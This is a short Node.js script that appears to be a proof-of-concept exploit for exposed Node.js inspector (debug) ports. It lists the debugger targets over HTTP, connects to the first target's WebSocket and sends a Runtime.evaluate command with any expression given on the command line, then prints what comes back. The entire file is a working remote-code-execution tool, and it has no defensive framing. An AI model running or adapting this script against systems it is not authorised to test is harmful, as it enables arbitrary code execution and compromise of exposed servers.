#!/usr/bin/env node
const http = require('http');
const WebSocket = require('ws');

// ANSI Color Codes
const RED = '\x1b[31m';
const GREEN = '\x1b[32m';
const YELLOW = '\x1b[33m';
const CYAN = '\x1b[36m';
const BOLD = '\x1b[1m';
const RESET = '\x1b[0m';

const host = process.argv[2] || '127.0.0.1:9229';
const expr = process.argv[3] || "process.pid + ' @ ' + require('os').hostname()";

http.get(`http://${host}/json/list`, (res) => {
  let data = '';

  res.on('data', (chunk) => { data += chunk; });

  res.on('end', () => {
    try {
      const targets = JSON.parse(data);
      if (!targets || targets.length === 0) {
        console.error(`${RED}[-] No inspector targets found.${RESET}`);
        process.exit(1);
      }

      const wsUrl = targets[0].webSocketDebuggerUrl;
      console.log(`${BOLD}${YELLOW}[!] EXPOSED INSPECTOR DETECTED:${RESET} ${CYAN}${wsUrl}${RESET}`);

      const ws = new WebSocket(wsUrl);

      ws.on('open', () => {
        const payload = {
          id: 1,
          method: 'Runtime.evaluate',
          params: {
            expression: expr,
            includeCommandLineAPI: true,
            returnByValue: true,
          },
        };
        ws.send(JSON.stringify(payload));
      });

      ws.on('message', (message) => {
        const msg = JSON.parse(message.toString());
        if (msg.id === 1) {
          console.log(`\n${BOLD}${GREEN}[+] EVALUATION OUTPUT:${RESET}`);
          if (msg.result && msg.result.value) {
            console.log(`${GREEN}${msg.result.value}${RESET}`);
          } else {
            console.log(JSON.stringify(msg.result, null, 2));
          }
          ws.close();
        }
      });

      ws.on('error', (err) => {
        console.error(`${RED}[-] WebSocket error: ${err.message}${RESET}`);
      });

    } catch (err) {
      console.error(`${RED}[-] Failed to parse HTTP response: ${err.message}${RESET}`);
    }
  });
}).on('error', (err) => {
  console.error(`${RED}[-] Connection error: ${err.message}${RESET}`);
});
